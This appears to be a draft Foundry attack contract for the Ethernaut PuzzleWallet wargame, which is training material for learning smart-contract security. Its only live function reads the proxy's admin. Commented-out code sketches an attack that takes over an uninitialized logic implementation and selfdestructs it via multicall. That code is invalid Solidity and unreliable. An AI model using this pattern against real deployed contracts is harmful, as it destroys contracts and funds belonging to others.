// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuzzleWallet.sol";

contract ProxyBypass {

    PuzzleProxy puzzleProxy;
    PuzzleWallet logicImpl;
    address public hacker;

    // constructor(address $your_ethernaut_proxy_here, address $your_logic_impl_here) {
    //     puzzleProxy = $your_ethernaut_proxy_here;
    //     logicImpl = $your_logic_impl_here;
    //     hacker = msg.sender;
    // }

    // function surgicalBypass() public {
    //     // pwn the logic implementation contract we got from our js script
    //     logicImpl.init(0);
    //     // selfdestruct() the logicImpl contract
    //     bytes memory scalpel = bytes(selfdestruct(puzzleProxy));
    //     logicImpl.multicall(scalpel);
    // }

    function checkAdmin() public view returns (address) {
        return puzzleProxy.admin();
    }
}
